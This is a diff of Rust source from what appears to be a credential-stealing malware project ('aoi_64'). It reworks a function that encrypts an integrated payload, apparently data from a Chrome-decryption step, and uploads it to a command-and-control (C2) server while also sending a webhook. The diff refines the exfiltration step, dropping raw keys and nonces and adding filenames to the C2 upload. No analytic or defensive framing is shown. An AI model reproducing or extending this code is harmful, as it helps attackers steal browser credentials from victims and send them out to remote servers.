@@ -449,17 +449,14 @@ async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
 
 /// データの暗号化・保存・送信処理
 async fn process_and_save_data(
-    mut payload: aoi_64::IntegratedPayload,
+    payload: aoi_64::IntegratedPayload,
     config: &aoi_64::Config,
     c2_client: &mut C2Client,
 ) -> Result<(), Box<dyn std::error::Error>> {
-    use aoi_64::utils::crypto::{process_and_encrypt_data, upload_encrypted_to_c2};
+    use aoi_64::utils::crypto::{process_and_encrypt_data, upload_encrypted_to_c2_with_filename};
 
-    // 暗号化処理を統合関数で実行
-    let (encrypted, wrapped, key, nonce) = process_and_encrypt_data(&payload, config).await?;
-    
-    // ペイロードに暗号化情報を追加
-    payload.update_encryption_info(&key, &nonce);
+    // 暗号化処理を統合関数で実行（セキュリティ強化: 生キー・ナンスは保持しない）
+    let (encrypted, wrapped, data_filename, _key_filename) = process_and_encrypt_data(&payload, config).await?;
 
     // C2アップロードとWebhook送信を可能なら並列化
     let upload_enabled = config.command_server_enabled;
@@ -467,7 +464,7 @@ async fn process_and_save_data(
 
     match (upload_enabled, webhook_enabled) {
         (true, true) => {
-            let upload_result = upload_encrypted_to_c2(c2_client, &encrypted, &wrapped, "integrated_payload").await;
+            let upload_result = upload_encrypted_to_c2_with_filename(c2_client, &encrypted, &wrapped, "integrated_payload", Some(&data_filename)).await;
             let webhook_result = send_unified_webhook(&payload, config).await;
             
             match upload_result {
@@ -481,7 +478,7 @@ async fn process_and_save_data(
             }
         }
         (true, false) => {
-            match upload_encrypted_to_c2(c2_client, &encrypted, &wrapped, "integrated_payload").await {
+            match upload_encrypted_to_c2_with_filename(c2_client, &encrypted, &wrapped, "integrated_payload", Some(&data_filename)).await {
                 Ok(()) => println!("✅ Encrypted data uploaded to C2 server successfully"),
                 Err(e) => println!("❌ C2 encrypted upload failed: {}", e),
             }
